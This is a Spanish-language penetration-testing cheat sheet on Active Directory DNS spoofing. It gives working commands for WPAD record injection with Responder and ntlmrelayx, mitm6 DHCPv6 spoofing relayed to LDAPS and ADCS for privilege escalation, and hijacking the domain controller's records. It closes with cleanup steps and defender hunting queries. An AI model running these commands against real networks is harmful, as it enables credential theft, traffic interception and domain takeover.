---
aliases:
  - DNS Spoofing AD
  - WPAD Attack
  - DNS Records Injection
  - mitm6 DNS
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/mitm
  - asset/active-directory
  - asset/dns
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - DNS & SRV Records]]'
  - '[[NTLM Relay]]'
  - '[[mitm6 - IPv6 DHCP Spoofing]]'
  - '[[LLMNR & NBT-NS Poisoning]]'
---
# AD - DNS & SRV Records - DNS Spoofing & Records Injection

***

## DNS Insecure Dynamic Update

| **Comando** | **Qué hace / detecta** | **Cuándo** |
|:---:|:---:|:---:|
| `nsupdate` interactive | Cliente DDNS Linux | Test insecure DDNS. |
| `Get-DnsServerZone -ComputerName <DC> \| ? DynamicUpdate -eq "NonsecureAndSecure"` | Zonas con DDNS insecure | Audit defender. |
| `Get-DnsServerZone -ComputerName <DC> \| ? DynamicUpdate -eq "Secure"` | Solo secure DDNS (Kerberos) | Hardened. |
| Event ID 5137 | Log de creación de objeto en `dnsZone` | Detection signal. |
^ad-spoof-ddns

```bash
# Test si DDNS insecure permite create sin auth
nsupdate <<EOF
server <DC>
zone corp.local.
update add testrecord.corp.local. 60 A 1.2.3.4
send
EOF

# Verify
dig +short A testrecord.corp.local @<DC>

# Cleanup
nsupdate <<EOF
server <DC>
zone corp.local.
update delete testrecord.corp.local. A
send
EOF
```

___

## WPAD Attack

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>` | Crear A record `wpad.corp.local` → atacante | Browsers IE/Edge auto-config. |
| `responder -I eth0 -wF -v` | Responder con WPAD server activo | Sirve `wpad.dat`. |
| `ntlmrelayx.py -tf relay_targets.txt -smb2support` | Relay credenciales capturadas vía WPAD | Combo. |
| `dig +short A wpad.corp.local @<DC>` | Verificar record creado | Pre/post check. |
^ad-spoof-wpad

**Cómo funciona:** Browsers IE/Edge buscan `wpad.<dom>` para auto-detectar proxy. A record `wpad` → attacker IP + servir `wpad.dat` con `FindProxyForURL` apuntando a attacker = MitM HTTP/HTTPS.

**Default DACL** = `Authenticated Users` con `CreateChild` sobre la zone = **cualquier user del domain puede crear `wpad`**.

```bash
# Pipeline completo
# 1. Crear record
python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>

# 2. Responder con WPAD
responder -I eth0 -wF -v

# 3. (paralelo) Relay a SMB sin signing
ntlmrelayx.py -tf relay_targets.txt -smb2support

# 4. Cleanup
python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
```

___

## mitm6 (IPv6 DHCP Spoofing)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mitm6 -d corp.local` | DHCPv6 spoofer + DNS hijack para domain target | IPv6 enabled (default Win). |
| `mitm6 -d corp.local --ignore-nofqdn` | Ignorar non-FQDN queries | Reduce noise. |
| `mitm6 -d corp.local --relay <attacker-IPv6>` | Forzar IP atacante específica | Custom routing. |
| `ntlmrelayx.py -6 -t ldaps://<DC> --escalate-user <attacker> --no-smb-server -wh attacker.corp.local` | Relay over IPv6 a LDAP con privesc | Modern combo. |
| `ntlmrelayx.py -6 -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController` | Relay a ADCS ESC8 | Cert-based privesc. |
^ad-spoof-mitm6

**Por qué funciona:** Windows tiene IPv6 enabled default + prefiere DHCPv6 sobre DHCPv4. mitm6 actúa como DHCPv6 server, asignando atacante como DNS server (IPv6). Todas las queries DNS pasan por atacante.

```bash
# Terminal 1: mitm6 spoofing
mitm6 -d corp.local

# Terminal 2: NTLM Relay listener
ntlmrelayx.py -6 -t ldaps://<DC> \
  --escalate-user atacante \
  --no-smb-server \
  -wh attacker.corp.local
```

___

## DNS Records Injection (Spoofing Targeted)

| **Comando** | **Spoof target** | **Impacto** |
|:---:|:---:|:---:|
| `dnstool.py -a modify -r dc01 -d <attacker-IP> <DC>` | Reemplazar A record DC | Auth queries → atacante (loud). |
| `dnstool.py -a add -r <hostname> -d <attacker-IP> <DC>` | Añadir A record nuevo | WPAD / fake apps. |
| `dnstool.py -a add -r mail -d <attacker-IP> <DC>` | Spoof mail server | Email interception interna. |
| Modificar SRV `_ldap._tcp.dc._msdcs` | Redirigir queries LDAP | Auth interception (rare, bien protegido). |
| Modificar SRV `_kerberos._tcp` | Redirigir KDC | Kerberos relay (critical). |
| `dnstool.py -a add -r isatap -d <attacker-IP> <DC>` | ISATAP IPv6 tunnel | Tunnel hijack. |
^ad-spoof-records

```bash
# Spoof targeted: DC IP swap (devastating, loud — solo demo)
ORIG_IP=$(dig +short A dc01.corp.local @<DC>)

# Hijack
python3 dnstool.py -u 'corp\u' -p pass -a remove -r dc01 <DC>
python3 dnstool.py -u 'corp\u' -p pass -a add -r dc01 -d <attacker-IP> <DC>

# Restore (siempre)
python3 dnstool.py -u 'corp\u' -p pass -a remove -r dc01 <DC>
python3 dnstool.py -u 'corp\u' -p pass -a add -r dc01 -d "$ORIG_IP" <DC>
```

___

## Cleanup y Detection

| **Comando** | **Para qué** | **Cuándo** |
|:---:|:---:|:---:|
| `dnstool.py -a remove -r <name> <DC>` | Quitar record | Post-engagement. |
| `dnstool.py -a remove -r <name> --remove-tombstone <DC>` | Purgar tombstone | Persistencia hunt. |
| `dnscmd <DC> /clearcache` | Limpiar cache server-side | Verificar restoration. |
| `ipconfig /flushdns` | Cache cliente | Per-host. |
| `Get-ADObject -SearchBase "DC=DomainDnsZones,..." -Filter {whenChanged -gt (Get-Date).AddDays(-1)}` | Records modificados últimas 24h | Defender hunt. |
| `(Get-ADObject "DC=<rec>,DC=<zone>,..." -Pr nTSecurityDescriptor).nTSecurityDescriptor.Owner` | Quien creó el record | Forensic attribution. |
| Event ID 5137 | LDAP create en `dnsNode` | Detection alert. |
| Event ID 257 (DNS server) | DNS server changes | Defender alert. |
^ad-spoof-cleanup

```powershell
# Hunt — records añadidos/modificados últimas 24h
Get-ADObject -SearchBase "DC=DomainDnsZones,DC=corp,DC=local" `
  -Filter {whenChanged -gt (Get-Date).AddDays(-1)} `
  -Properties whenChanged,whenCreated |
  Select Name,DistinguishedName,whenCreated,whenChanged |
  Sort whenChanged -Descending

# Records sospechosos hardcoded
$Suspicious = Get-DnsServerResourceRecord -ZoneName corp.local -ComputerName <DC> |
  Where { $_.HostName -in '*','wpad','isatap' -or $_.HostName -match '^_(kerberos|ldap)' }

$Suspicious | Select RecordType,HostName,RecordData,Timestamp
```

***
